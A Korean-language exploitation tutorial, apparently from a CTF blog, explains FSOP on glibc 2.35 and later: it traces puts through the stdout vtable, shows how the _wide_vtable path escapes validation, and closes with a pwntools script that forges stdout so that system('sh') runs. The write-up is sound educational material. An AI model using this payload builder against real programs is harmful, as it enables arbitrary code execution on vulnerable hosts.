---
published: false
layout: post
title: 'FSOP for libc 2.35 and over [KR]'
category: pwn
tags:
  - - FSOP
excerpt_separator: <!--more-->
---
<!--more-->
<br/>
<br/>

## `_IO_FILE`  struct

---

```c
#include <stdio.h>

int main()
{
    FILE* fp = fopen("test.txt", "w");
    fprintf(fp, "Hello World!\n");
    fclose(fp);
}
```
FSOP를 사용하기 위해서 FILE 구조체가 IO 함수에서 어떻게 사용되는지 파악해야 한다.
fopen에서 반환되어 fp가 가리키는 FILE 구조체는 다음과 같이 생겼다. 
<br/>
<br/>

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/bits/types/FILE.h#L6
/* The opaque type of streams.  This is the definition used elsewhere.  */
typedef struct _IO_FILE FILE;

gef➤  ptype struct _IO_FILE
type = struct _IO_FILE {
    int _flags;
    char *_IO_read_ptr;
    char *_IO_read_end;
    char *_IO_read_base;
    char *_IO_write_base;
    char *_IO_write_ptr;
    char *_IO_write_end;
    char *_IO_buf_base;
    char *_IO_buf_end;
    char *_IO_save_base;
    char *_IO_backup_base;
    char *_IO_save_end;
    struct _IO_marker *_markers;
    struct _IO_FILE *_chain;
    int _fileno;
    int _flags2;
    __off_t _old_offset;
    unsigned short _cur_column;
    signed char _vtable_offset;
    char _shortbuf[1];
    _IO_lock_t *_lock;
    __off64_t _offset;
    struct _IO_codecvt *_codecvt;
    struct _IO_wide_data *_wide_data;
    struct _IO_FILE *_freeres_list;
    void *_freeres_buf;
    size_t __pad5;
    int _mode;
    char _unused2[20];
}
```

`FILE(=_IO_FILE)`은 gdb에서 `ptype struct [struct name]` 으로 확인할 수 있다.
stream의 입력, 출력을 위한 여러 멤버 변수들이 존재하는데 필요한 변수에 대해서만 이후에 살펴보자.
<br/>
<br/>


## `stdout` vs `_IO_2_1_stdout_`  
---
`stdout`과 `_IO_2_1_stdout_`이 실제로 어떻게 정의됐는지도 확인을 해보면,

```c
//https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/stdfiles.c#L35

#ifdef _IO_MTSAFE_IO
# define DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \
  static _IO_lock_t _IO_stdfile_##FD##_lock = _IO_lock_initializer; \
  static struct _IO_wide_data _IO_wide_data_##FD \
    = { ._wide_vtable = &_IO_wfile_jumps }; \
  struct _IO_FILE_plus NAME \
    = {FILEBUF_LITERAL(CHAIN, FLAGS, FD, &_IO_wide_data_##FD), \
       &_IO_file_jumps};
#else
# define DEF_STDFILE(NAME, FD, CHAIN, FLAGS) \
  static struct _IO_wide_data _IO_wide_data_##FD \
    = { ._wide_vtable = &_IO_wfile_jumps }; \
  struct _IO_FILE_plus NAME \
    = {FILEBUF_LITERAL(CHAIN, FLAGS, FD, &_IO_wide_data_##FD), \
       &_IO_file_jumps};
#endif

DEF_STDFILE(_IO_2_1_stdin_, 0, 0, _IO_NO_WRITES);
DEF_STDFILE(_IO_2_1_stdout_, 1, &_IO_2_1_stdin_, _IO_NO_READS);
DEF_STDFILE(_IO_2_1_stderr_, 2, &_IO_2_1_stdout_, _IO_NO_READS+_IO_UNBUFFERED);

struct _IO_FILE_plus *_IO_list_all = &_IO_2_1_stderr_;
libc_hidden_data_def (_IO_list_all)
```

`_IO_2_1_stdout_`은 libio/stdfiles.c에서 정의된다. `_IO_FILE_plus` 자료형으로 선언되며 `_IO_FILE` 내 `chain` 포인터로 `_IO_2_1_stdin_, stdout_, stderr_`가 연결되어 있는 것을 확인할 수 있다.
<br/>
<br/>


```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L324
struct _IO_FILE_plus {
    FILE file;
    const struct _IO_jump_t *vtable;
}
```
`_IO_FILE_plus`는 `FILE` 구조체에 `_IO_jump_t` vtable이 추가된 버전이다. vtable이 어떻게 사용되며 검증되는지는 이후에 다룰 예정이다. 다시 stdout으로 넘어가자.
<br/>
<br/>

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/stdio.c#L33
FILE *stdin = (FILE *) &_IO_2_1_stdin_;
FILE *stdout = (FILE *) &_IO_2_1_stdout_;
FILE *stderr = (FILE *) &_IO_2_1_stderr_;
```
`stdout`은 libio/stdio.c에서 정의하며, `_IO_2_1_stdout_`을 가리키는 `FILE*`이다.

정리하면 data 영역의 `stdout`은 libc 영역의 `_IO_2_1_stdout_`을 가리키는 `FILE*` (=`_IO_FILE*`) 포인터이다.
실제 `_IO_2_1_stdout_`은 `_IO_FILE` 구조체에 더해 `_IO_jump_t` vtable을 갖고 있다.
`_IO_FILE_plus`로 정의한 `_IO_2_1_stdout_` 을 `FILE* stdout`으로 포장하여 stdio.h에서 제공하고 있다.
<br/>
<br/>

![stdout.png](/assets/img/stdout.png)

위와 같이 GDB로 각 구조체의 멤버변수 값을 런타임에 확인할 수 있다.
<br/>
<br/>
<br/>

## puts로 살펴보는 vtable 참조
---

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}

weak_alias (_IO_puts, puts)
libc_hidden_def (_IO_puts)

```
`puts`는 위와 같이 정의되어 있다. 이후 FSOP에 사용할 `_IO_sputn`의 정의를 자세히 살펴보면 
<br/>
<br/>


```c
#define _IO_sputn(__fp, __s, __n) _IO_XSPUTN (__fp, __s, __n)
#define _IO_XSPUTN(FP, DATA, N) JUMP2 (__xsputn, FP, DATA, N)
#define JUMP2(FUNC, THIS, X1, X2) (_IO_JUMPS_FUNC(THIS)->FUNC) (THIS, X1, X2)

# define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable (_IO_JUMPS_FILE_plus (THIS)))
```

`_IO_sputn` -> `_IO_XSPUTN` -> `JUMP2(__xsputn, ...)` -> `_IO_JUMPS_FUNC(THIS)->__xsputn` 인 것을 확인할 수 있다.
이때 `_IO_JUMPS_FUNC` = `IO_validate_vtable`에서 vtable에 대한 검증이 존재하는 것을 확인할 수 있다.
<br/>
<br/>


```c
/* Perform vtable pointer validation.  If validation fails, terminate
   the process.  */
static inline const struct _IO_jump_t *
IO_validate_vtable (const struct _IO_jump_t *vtable)
{
  /* Fast path: The vtable pointer is within the __libc_IO_vtables
     section.  */
  uintptr_t section_length = __stop___libc_IO_vtables - __start___libc_IO_vtables;
  uintptr_t ptr = (uintptr_t) vtable;
  uintptr_t offset = ptr - (uintptr_t) __start___libc_IO_vtables;
  if (__glibc_unlikely (offset >= section_length))
    /* The vtable pointer is not in the expected section.  Use the
       slow path, which will terminate the process if necessary.  */
    _IO_vtable_check ();
  return vtable;
}
```
넘겨준 vtable이 libc의 vtable section 안에 존재하는지 검증한다. 검증에 성공할 경우 인자로 받았던 vtable 포인터를 그대로 반환하여 멤버 함수를 참조한다. 이 검증이 없었을 때에는 vtable을 fake table로 바꿔주기만 하면 RCE가 가능했다. 
<br/>
<br/>

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L293
struct _IO_jump_t
{
    JUMP_FIELD(size_t, __dummy);
    JUMP_FIELD(size_t, __dummy2);
    JUMP_FIELD(_IO_finish_t, __finish);
    JUMP_FIELD(_IO_overflow_t, __overflow);
    JUMP_FIELD(_IO_underflow_t, __underflow);
    JUMP_FIELD(_IO_underflow_t, __uflow);
    JUMP_FIELD(_IO_pbackfail_t, __pbackfail);
    /* showmany */
    JUMP_FIELD(_IO_xsputn_t, __xsputn);
    JUMP_FIELD(_IO_xsgetn_t, __xsgetn);
    JUMP_FIELD(_IO_seekoff_t, __seekoff);
    JUMP_FIELD(_IO_seekpos_t, __seekpos);
    JUMP_FIELD(_IO_setbuf_t, __setbuf);
    JUMP_FIELD(_IO_sync_t, __sync);
    JUMP_FIELD(_IO_doallocate_t, __doallocate);
    JUMP_FIELD(_IO_read_t, __read);
    JUMP_FIELD(_IO_write_t, __write);
    JUMP_FIELD(_IO_seek_t, __seek);
    JUMP_FIELD(_IO_close_t, __close);
    JUMP_FIELD(_IO_stat_t, __stat);
    JUMP_FIELD(_IO_showmanyc_t, __showmanyc);
    JUMP_FIELD(_IO_imbue_t, __imbue);
};
```
`_IO_jump_t` 타입의 vtable은 위와 같이 생겼다. 앞서 실행 흐름을 다시 살펴보면 `_IO_sputn` -> `_IO_XSPUTN` -> `JUMP2(__xsputn, ...)` -> `_IO_JUMPS_FUNC(THIS)->__xsputn`이었다.
<br/>
<br/>

puts를 실행할 때를 기준으로 정리하면 `_IO_2_1_stdout_.vtable->__xsputn`이 호출되는 것이다. FSOP는 vtable 검증을 우회하고 임의 함수를 실행하기 위해  

1. vtable의 주소가 libc의 vtable section 내에 존재하기만 하면 된다.
2. vtable section 내의 vtable 중 하나인 `_wide_vtable`을 참조할 때는 검증이 존재하지 않는다.

위의 두 가지를 이용한다.
<br/>
<br/>

## `_wide_vtable`의 검증 부재
---
```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/wgenops.c#L363
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)
      return;
  _IO_wsetb (fp, fp->_wide_data->_shortbuf,
		     fp->_wide_data->_shortbuf + 1, 0);
}
libc_hidden_def (_IO_wdoallocbuf)
```
`_wide_vtable`을 참조하는 내부 루틴 중 하나인 `_IO_WDOALLOCATE`을 살펴보면
<br/>
<br/>

```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L223
#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L130
#define WJUMP0(FUNC, THIS) (_IO_WIDE_JUMPS_FUNC(THIS)->FUNC) (THIS)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L121
#define _IO_WIDE_JUMPS_FUNC(THIS) _IO_WIDE_JUMPS(THIS)

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L101
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable

// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/libioP.h#L94
#define _IO_CAST_FIELD_ACCESS(THIS, TYPE, MEMBER) \
  (*(_IO_MEMBER_TYPE (TYPE, MEMBER) *)(((char *) (THIS)) \
				       + offsetof(TYPE, MEMBER)))

```

`#define _IO_JUMPS_FUNC(THIS) (IO_validate_vtable((THIS)))`  
<br/>

앞서 살펴본 `_IO_FILE_JUMPS`에서는 검증을 진행했던 것과 다르게 바로 포인터로 캐스팅해주는 것을 확인할 수 있다.
<br/>
<br/>

이를 이용해서 FSOP는
1. `_IO_2_1_stdout_.vtable`이 `_wide_vtable`을 가리키도록 한다. 
(구체적으로 이 포스트에서 다루는 FSOP path에서는 정확히 `_IO_2_1_stdout_.vtable->__xsputn == _IO_wfile_jumps->_IO_file_overflow`가 되도록 한다.)


2. `_IO_wfile_jumps->_IO_file_overflow`에서 호출하는 내부 루틴이 `_wide_vtable`을 참조하게 될텐데, 
<br/>

```c
#define _IO_WIDE_JUMPS(THIS) \
  _IO_CAST_FIELD_ACCESS ((THIS), struct _IO_FILE, _wide_data)->_wide_vtable
```
이때 내부 루틴에서 참조하는 `_wide_vtable`은 `_IO_2_1_stdout_._wide_data->_wide_vtable`에 해당하며,
libc leak + AAW로 `_IO_2_1_stdout_._wide_data`를 자유롭게 덮을 수 있는 상황을 가정하고 있다.
<br/>

따라서 내부 루틴에서 검증없이 참조하는 `wide_vtable`이 fake table을 가리키도록 할 수 있다.

<br/>

## Code Flow
---
이제 FSOP가 의도하는 코드 흐름을 살펴보자. 앞서 미리 적은 것처럼
1. `_IO_puts`에서 `_IO_sputn`을 호출하는데, 이때 `_IO_2_1_stdout`의 vtable이 `_wide_vtable`을 가리키도록 덮어 `_IO_wfile_overflow`을 호출한다. `_IO_wfile_overflow`은 차례로 `_IO_wdoallocbuf`, `_IO_WDOALLOCATE (fp)`을 호출한다.

2. `_IO_WDOALLOCATE (fp)`에서 `_wide_vtable`에 대한 검증이 없기 때문에 fake table을 사용하여 `system()`을 호출한다.
<br/>

정리하면 다음과 같다.
`_IO_puts` → (`_IO_sputn` , corrupted vtable) → `_IO_wfile_overflow` → `_IO_wdoallocbuf` → `_IO_WDOALLOCATE (fp)`

코드 흐름에서 constraints가 몇 가지 존재하여 코드와 같이 정리했다.
<br/>
<br/>

### puts
---
```c
// https://elixir.bootlin.com/glibc/glibc-2.35/source/libio/ioputs.c#L31
int
_IO_puts (const char *str)
{
  int result = EOF;
  size_t len = strlen (str);
  _IO_acquire_lock (stdout);

  if ((_IO_vtable_offset (stdout) != 0
       || _IO_fwide (stdout, -1) == -1)
      && _IO_sputn (stdout, str, len) == len
      && _IO_putc_unlocked ('\n', stdout) != EOF)
    result = MIN (INT_MAX, len + 1);

  _IO_release_lock (stdout);
  return result;
}
```
* Constraints
1. `_IO_acquire_lock`이 있어 `_IO_2_1_stdout`의 멤버변수 lock이 rw 영역을 가리켜야 한다.<br/>(이렇게만 주면 충분 - libc.symbols['_IO_2_1_stdout_'] + 0x10) <br/>
2. `vtable->__xsputn == _IO_wfile_overflow`<br/> `_IO_2_1_stdout`의 vtable을 덮어 `_IO_sputn`을 호출했을 때 `_IO_wfile_jumps->__overflow`에 해당하는 `_IO_wfile_overflow`이 호출되도록 한다.
<br/>
<br/>

### _IO_wfile_overflow

---

```c
wint_t
_IO_wfile_overflow (FILE *f, wint_t wch)
{
  if (f->_flags & _IO_NO_WRITES) /* SET ERROR */
    {
      f->_flags |= _IO_ERR_SEEN;
      __set_errno (EBADF);
      return WEOF;
    }
  /* If currently reading or no buffer allocated. */
  if ((f->_flags & _IO_CURRENTLY_PUTTING) == 0)
    {
      /* Allocate a buffer if needed. */
      if (f->_wide_data->_IO_write_base == 0)
	{
	  _IO_wdoallocbuf (f);
		// [...]
	}
}
```
* Constraints (`f=stdout`)
1. `f->_flags & _IO_NO_WRITES == 0`
2. `f->_flags & _IO_CURRENTLY_PUTTING == 0`
3. `f->_wide_data->_IO_write_base == 0`
<br/>
<br/>


### _IO_wdoallocbuf

---

```c
void
_IO_wdoallocbuf (FILE *fp)
{
  if (fp->_wide_data->_IO_buf_base)
    return;
  if (!(fp->_flags & _IO_UNBUFFERED))
    if ((wint_t)_IO_WDOALLOCATE (fp) != WEOF)

#define _IO_WDOALLOCATE(FP) WJUMP0 (__doallocate, FP)
```
* Constraints (`fp=stdout`)
1. `fp->_wide_data->_IO_buf_base == 0`
2. `fp->_flags & _IO_UNBUFFERED == 0`
3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`
<br/>
<br/>


## Constraints
---
나온 제약 조건을 정리하면 다음과 같다.
- puts
1. `fp = stdout` 
2. `fp->lock` → rw
3. `fp->vtable->__xsputn == _IO_wfile_overflow`

- _IO_wfile_overflow
1. `fp->_flags & _IO_NO_WRITES == 0`
2. `fp->_flags & _IO_CURRENTLY_PUTTING == 0`
3. `fp->_wide_data->_IO_write_base == 0`

- _IO_wdoallocbuf
1. `fp->_wide_data->_IO_buf_base == 0`
2. `fp->_flags & _IO_UNBUFFERED == 0`
3. `fp->_wide_data->_wide_vtable_->__doallocate == libc_system`

이제 fp의 각 인자에 대해 제약 조건을 정리하자.
<br/>
<br/>

### fp→vtable

---
`vtable->__xsputn == _IO_wfile_jumps.__overflow`
이 조건이 충족되도록 fp를 구성하기 위해 `_IO_jump_t` 에서 `__xsputn`, `__overflow`의 offset을 확인해야 한다.

```c
gef➤  ptype /o _IO_wfile_jumps
/* offset      |    size */  type = const struct _IO_jump_t {
/*      0      |       8 */    size_t __dummy;
/*      8      |       8 */    size_t __dummy2;
/*     16      |       8 */    _IO_finish_t __finish;
/*     24      |       8 */    _IO_overflow_t __overflow;
/*     32      |       8 */    _IO_underflow_t __underflow;
/*     40      |       8 */    _IO_underflow_t __uflow;
/*     48      |       8 */    _IO_pbackfail_t __pbackfail;
/*     56      |       8 */    _IO_xsputn_t __xsputn;
/*     64      |       8 */    _IO_xsgetn_t __xsgetn;
/*     72      |       8 */    _IO_seekoff_t __seekoff;
/*     80      |       8 */    _IO_seekpos_t __seekpos;
/*     88      |       8 */    _IO_setbuf_t __setbuf;
/*     96      |       8 */    _IO_sync_t __sync;
/*    104      |       8 */    _IO_doallocate_t __doallocate;
/*    112      |       8 */    _IO_read_t __read;
/*    120      |       8 */    _IO_write_t __write;
/*    128      |       8 */    _IO_seek_t __seek;
/*    136      |       8 */    _IO_close_t __close;
/*    144      |       8 */    _IO_stat_t __stat;
/*    152      |       8 */    _IO_showmanyc_t __showmanyc;
/*    160      |       8 */    _IO_imbue_t __imbue;

                               /* total size (bytes):  168 */
                             }
```

- `__overflow` : 24 (0x18)
- `__xsputn` :  56 (0x38)

⇒ `fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
으로 설정하면 `vtable->__xsputn`이 정확히 `_IO_wfile_jumps - 0x20 + 0x38 == _IO_wfile_jumps.__overflow` ⇒ `_IO_wfile_overflow` 을 가리킴.
<br/>
<br/>

### fp→_flags

---

`_flags & _IO_NO_WRITES == 0`

`_flags & _IO_CURRENTLY_PUTTING == 0`

`_flags & _IO_UNBUFFERED == 0`

```c
// #define _IO_NO_WRITES         0x0008
// #define _IO_CURRENTLY_PUTTING 0x0800
// #define _IO_UNBUFFERED        0x0002
```
코드 흐름의 가장 마지막에서 `_IO_WDOALLOCATE (fp)`가 호출되는데, `_IO_FILE`의 첫번째 멤버 변수인 `_flags`를 통해 RDI에 sh를 넣을 수 있다. 하위 2바이트를 `\x01\x01` 으로 구성하면 null이 들어가지 않게 검증을 통과할 수 있다.

`fp._flags` → `b"\x01\x01;sh;\x00\x00”` 로 구성하여 최종 단계에서 RDI에 `\x01\x01;sh;`가 들어가도록 하자.
<br/>
<br/>

### fp→_wide_data

---
`_wide_data->_IO_buf_base == 0` 
`_wide_data->_IO_write_base == 0`
`_wide_data->_wide_vtable_->__doallocate == libc_system` 
3가지 조건을 만족해야 한다.

```c
gef➤  ptype /o struct _IO_wide_data
/* offset      |    size */  type = struct _IO_wide_data {
/*      0      |       8 */    wchar_t *_IO_read_ptr;
/*      8      |       8 */    wchar_t *_IO_read_end;
/*     16      |       8 */    wchar_t *_IO_read_base;
/*     24      |       8 */    wchar_t *_IO_write_base;
/*     32      |       8 */    wchar_t *_IO_write_ptr;
/*     40      |       8 */    wchar_t *_IO_write_end;
/*     48      |       8 */    wchar_t *_IO_buf_base;
/*     56      |       8 */    wchar_t *_IO_buf_end;
/*     64      |       8 */    wchar_t *_IO_save_base;
/*     72      |       8 */    wchar_t *_IO_backup_base;
/*     80      |       8 */    wchar_t *_IO_save_end;
/*     88      |       8 */    __mbstate_t _IO_state;
/*     96      |       8 */    __mbstate_t _IO_last_state;
/*    104      |     112 */    struct _IO_codecvt {
/*    104      |      56 */        _IO_iconv_t __cd_in;
/*    160      |      56 */        _IO_iconv_t __cd_out;

                                   /* total size (bytes):  112 */
                               } _codecvt;
/*    216      |       4 */    wchar_t _shortbuf[1];
/* XXX  4-byte hole      */
/*    224      |       8 */    const struct _IO_jump_t *_wide_vtable;

                               /* total size (bytes):  232 */
                             }

gef➤  ptype /o _IO_wfile_jumps
/* offset      |    size */  type = const struct _IO_jump_t {
/*      0      |       8 */    size_t __dummy;
/*      8      |       8 */    size_t __dummy2;

  ...
  
/*    104      |       8 */    _IO_doallocate_t __doallocate;

```

`*(_wide_data+24) == 0`
`*(_wide_data+48) == 0`
의 두 가지 조건과 더불어

`*(*(_wide_data+224)+104) == libc_system`을 만족해야 한다.

```c
type = struct _IO_FILE {
/*      0      |       4 */    int _flags;
/* XXX  4-byte hole      */
/*      8      |       8 */    char *_IO_read_ptr;
/*     16      |       8 */    char *_IO_read_end;
/*     24      |       8 */    char *_IO_read_base;
/*     32      |       8 */    char *_IO_write_base;

  ...
    
/*    184      |       8 */    size_t __pad5;
/*    192      |       4 */    int _mode;
/*    196      |      20 */    char _unused2[20];

                               /* total size (bytes):  216 */
                             } *
```

`fp->_wide_data = &_IO_2_1_stdout_ - 16`와 같이 설정할 경우

`*(_wide_data+24) == fp->_IO_read_ptr == 0`
`*(_wide_data+48) == fp->_IO_write_base == 0`
`*(*(_wide_data+224)+104) == *(*(QWORD**)&fp->_unused2[12]+104//8) == &libc_system`으로 조건을 설정할 수 있다.

`*(QWORD*)fp->_unused2[12] = (QWORD)&fp->_unused2-104, *(QWORD*)&fp->_unused2= &libc_system`으로 설정했다.

<br/>
<br/>


## 결론
---
`fp->_flags == b"\x01\x01;sh;\x00\x00"`

`fp->_lock == libc.symbols['_IO_2_1_stdout_'] + 0x10`

`fp->vtable = libc['_IO_wfile_jumps'] - 0x20`
<br/>
<br/>

`fp->_wide_data = libc.symbols['_IO_2_1_stdout_'] - 16`

`fp->_IO_read_ptr == 0`

`fp->_IO_write_base == 0`

`fp->_unused2 = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104)`

이렇게 stdout을 구성하면 system("sh")를 호출할 수 있다. 
<br/>
<br/>

```python
libc.address = libc_base
def FSOP_struct(flags = 0, _IO_read_ptr = 0, _IO_read_end = 0, _IO_read_base = 0,\
_IO_write_base = 0, _IO_write_ptr = 0, _IO_write_end = 0, _IO_buf_base = 0, _IO_buf_end = 0,\
_IO_save_base = 0, _IO_backup_base = 0, _IO_save_end = 0, _markers= 0, _chain = 0, _fileno = 0,\
_flags2 = 0, _old_offset = 0, _cur_column = 0, _vtable_offset = 0, _shortbuf = 0, lock = 0,\
_offset = 0, _codecvt = 0, _wide_data = 0, _freeres_list = 0, _freeres_buf = 0,\
__pad5 = 0, _mode = 0, _unused2 = b"", vtable = 0, more_append = b""):
    
    FSOP = p64(flags) + p64(_IO_read_ptr) + p64(_IO_read_end) + p64(_IO_read_base)
    FSOP += p64(_IO_write_base) + p64(_IO_write_ptr) + p64(_IO_write_end)
    FSOP += p64(_IO_buf_base) + p64(_IO_buf_end) + p64(_IO_save_base) + p64(_IO_backup_base) + p64(_IO_save_end)
    FSOP += p64(_markers) + p64(_chain) + p32(_fileno) + p32(_flags2)
    FSOP += p64(_old_offset) + p16(_cur_column) + p8(_vtable_offset) + p8(_shortbuf) + p32(0x0)
    FSOP += p64(lock) + p64(_offset) + p64(_codecvt) + p64(_wide_data) + p64(_freeres_list) + p64(_freeres_buf)
    FSOP += p64(__pad5) + p32(_mode)
    if _unused2 == b"":
        FSOP += b"\x00"*0x14
    else:
        FSOP += _unused2[0x0:0x14].ljust(0x14, b"\x00")
    
    FSOP += p64(vtable)
    FSOP += more_append
    return FSOP

_IO_file_jumps = libc.symbols['_IO_file_jumps']
stdout = libc.symbols['_IO_2_1_stdout_']
log.info("stdout: " + hex(stdout))
FSOP = FSOP_struct(flags = u64(b"\x01\x01;sh;\x00\x00"), \
        lock            = libc.symbols['_IO_2_1_stdout_'] + 0x10, \
        _IO_read_ptr    = 0x0, \
        _IO_write_base  = 0x0, \
        _wide_data      = libc.symbols['_IO_2_1_stdout_'] - 0x10, \
        _unused2        = p64(libc.symbols['system'])+ b"\x00"*4 + p64(libc.symbols['_IO_2_1_stdout_'] + 196 - 104), \
        vtable          = libc.symbols['_IO_wfile_jumps'] - 0x20, \
        )
```
이를 코드로 정리하면 위와 같다.
<br/>
<br/>

## Reference
---
[Deep dive into FSOP](https://niftic.ca/posts/fsop/)

[Angry-FSROP](https://blog.kylebot.net/2022/10/22/angry-FSROP/)
